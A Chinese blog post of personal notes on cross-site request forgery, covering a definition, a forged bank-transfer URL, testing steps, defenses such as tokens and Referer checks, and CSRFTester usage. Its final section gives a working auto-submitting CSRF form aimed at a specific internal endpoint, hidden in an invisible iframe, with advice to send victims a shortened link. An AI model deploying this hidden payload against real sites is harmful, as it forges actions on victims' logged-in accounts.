title: CSRF笔记
author: Believe firmly
tags:
  - web技术
categories: []
date: 2018-11-09 18:07:00
---
### 0x00：CSRF 简述

CSRF（Cross Site Request Forgery，跨站请求伪造），字面理解意思就是在别的站点伪造了一个请求。专业术语来说就是在受害者访问一个网站时，其 Cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。
<!--more-->
### 0x01：CSRF 案例
受害者 (A) 登录了某个银行给朋友 (B) 转账，其转账操作发送的请求 URL 如下:

     https://www.xxxx.com?account=A&money=10000&touser=B

account 代表受害者，money 是要转账的金额，touser 是被转入的账户。发送这个链接请求后，A 给 B 转账的操作完成。这时攻击者（C）伪造了一个链接，如下：

     https://www.xxxx.com?account=A&money=10000&touser=C
这个链接的请求是 A 用户给 C 用户转账一万元。当 A 没有登录不存在 Cookie 信息时，此链接是无法执行的。这时攻击者通过一系列手段让 A 执行此链接，当 A 登录银行没有退出的时候，点击此链接便会执行成功。

### 0x02：代码示例
当程序对于类似此敏感信息操作提交时，没有进行相应的防护，便会产生 CSRF 攻击，例如一下代码：
```
<form method="GET" action="/transferFunds">
 
    转账金额：<input type="text" name="money">
    转入账户：<input type="text" name="touser">
    <input type="submit" name="action" value="提交">
 
</form>
```
#### 0x03：如何测试
在渗透测试中，可以先看下网页源代码对于敏感信息提交有无防护措施，初步判断是否存在 CSRF，随后通过抓包确定提交的完整 URL 链接，并伪造另一个链接进行测试。
在代码审计中，可以先查看网页源代码，是否有防护措施。随后可查看 WEB 应用程序的配置文件中是否有相应的验证措施，最后查看后台的处理逻辑，对于发送过来的请求是否有过滤等措施。

### 0x04：防护方法
1，二次验证，进行重要敏感操作时，要求用户进行二次验证。

2，验证码，进行重要敏感操作时，加入验证码。

3，验证 HTTP 的 Referer 字段。

4，请求地址中添加 Token 并验证。

5，HTTP 头中自定义属性并验证。

### CSRFTester的使用
1、下载CSRFTester，并启动run.bat，终端显示代理地址：‘127.0.0.18008’

2、按照上一步中的代理地址，设置浏览器代理。

3、在网站中登录后，发送一个请求（添加工作经历）。

4、点击Start Recording，利用CSRFTester抓取请求，并对求情参数进行修改：
![](1.png)

5、点Generate HTML生成脚本

6、在浏览器不退出登录情况下，打开生成的脚本，则发现新添加一条信息，则证明此处存在CSRF漏洞。

### 关于csrf隐藏利用的方法

一.准备两个页面 ，一个放csrf的代码 1.html，另一个页面2.html 用iframe包含住1.html
二.吧改进好的文件放入自己的服务器然后通过短链接网站生成链接发送给受害者。
2.html
```bash
<iframe src="1.html"style="display:none"></iframe>
```
1.html
 ```bash

<html>
  <head>
<script>
 
function sub(){
 
document.form1.submit();
}
setTimeout(sub,1);
</script>
</head>
  <body>
 
    <form name="form1" action="http://192.168.2.107:35080/puhuihuaPboc/back/activity/issue/ajax/addOrEditArticle" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="theirChannel" value="wn" />
      <input type="hidden" name="title" value="6666" />
      <input type="hidden" name="theirChildChannel" value="0" />
      <input type="hidden" name="cover" value="" />
      <input type="hidden" name="coverImage" value="" />
      <input type="hidden" name="targetOut" value="0" />
      <input type="hidden" name="targetUrl" value="" />
      <input type="hidden" name="content" value="&lt;p&gt;6666&lt;&#47;p&gt;" />
      <input type="hidden" name="districtId" value="0" />
      <input type="submit" value="Submit request" style="display:none" />
    </form>
  </body>
</html>

```